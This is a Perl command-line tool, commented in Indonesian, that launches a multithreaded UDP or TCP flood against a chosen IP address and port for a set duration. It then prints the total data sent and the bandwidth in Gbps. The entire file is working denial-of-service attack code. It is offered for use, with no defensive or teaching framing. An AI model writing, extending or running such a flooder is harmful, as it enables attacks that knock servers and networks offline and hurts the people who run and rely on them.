#!/usr/bin/perl

# FATZXX<----

use strict;
use warnings;
use Socket;
use threads;
use IO::Socket;
use Getopt::Long;
use Time::HiRes qw(time);
use Fcntl qw(F_SETFL O_NONBLOCK);  # Menambahkan modul Fcntl untuk F_SETFL dan O_NONBLOCK

# Fungsi untuk mencetak usage
sub usage {
    die "Usage: $0 --ip <IP> --port <PORT> --size <SIZE> --time <TIME> --method <udp|tcp>\n";
}

# Mendapatkan argumen dari command line
my ($ip, $port, $size, $time, $method);
GetOptions(
    "ip=s"     => \$ip,
    "port=i"   => \$port,
    "size=i"   => \$size,
    "time=i"   => \$time,
    "method=s" => \$method,
) or usage();

# Memastikan semua argumen diberikan
usage() unless ($ip && $port && $size && $time && $method);

# Memastikan IP valid
my $iaddr = inet_aton($ip) or die "Cannot resolve hostname $ip\n";
my $endtime = time() + ($time ? $time : 100);
my $num_threads = 100;  # Jumlah thread yang digunakan untuk mencapai throughput tinggi

# Fungsi untuk UDP flood
sub udp_flood {
    my ($ip, $port, $size, $time) = @_;
    my $iaddr = inet_aton($ip);
    my $endtime = time() + $time;
    my $total_bytes = 0;
    socket(my $flood, PF_INET, SOCK_DGRAM, 17) or die "Could not create socket: $!\n";
    fcntl($flood, F_SETFL, O_NONBLOCK);

    while (time() <= $endtime) {
        my $psize = $size ? $size : 1024;  # Menggunakan ukuran paket yang lebih besar
        my $pport = $port ? $port : int(rand(65535))+1;
        send($flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
        $total_bytes += $psize;
    }
    return $total_bytes;
}

# Fungsi untuk TCP flood
sub tcp_flood {
    my ($ip, $port, $size, $time) = @_;
    my $iaddr = inet_aton($ip);
    my $endtime = time() + $time;
    my $total_bytes = 0;

    while (time() <= $endtime) {
        socket(my $sock, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or next;
        connect($sock, pack_sockaddr_in($port, $iaddr)) or next;
        my $psize = $size ? $size : 1024;  # Menggunakan ukuran paket yang lebih besar
        send($sock, pack("a$psize", "flood"), 0);
        $total_bytes += $psize;
        close($sock);
    }
    return $total_bytes;
}

print "Starting $method flood attack on $ip at port $port with " .
      ($size ? "$size-byte" : "random size") . " packets" .
      ($time ? " for $time seconds" : "") . "\n";

# Memulai beberapa thread untuk metode yang dipilih
my @threads;
if ($method eq 'udp') {
    for (1..$num_threads) {
        push @threads, threads->create(\&udp_flood, $ip, $port, $size, $time);
    }
} elsif ($method eq 'tcp') {
    for (1..$num_threads) {
        push @threads, threads->create(\&tcp_flood, $ip, $port, $size, $time);
    }
} else {
    die "Unknown method: $method\n";
}

# Menghitung total bytes yang dikirim
my $total_bytes = 0;
foreach my $thread (@threads) {
    $total_bytes += $thread->join();
}

# Menghitung bandwidth
my $duration = $time ? $time : 100;
my $bandwidth_gbps = ($total_bytes * 8) / ($duration * 1_000_000_000);

print "Flood attack completed.\n";
print "Total data sent: $total_bytes bytes\n";
print "Average bandwidth: $bandwidth_gbps Gbps\n";
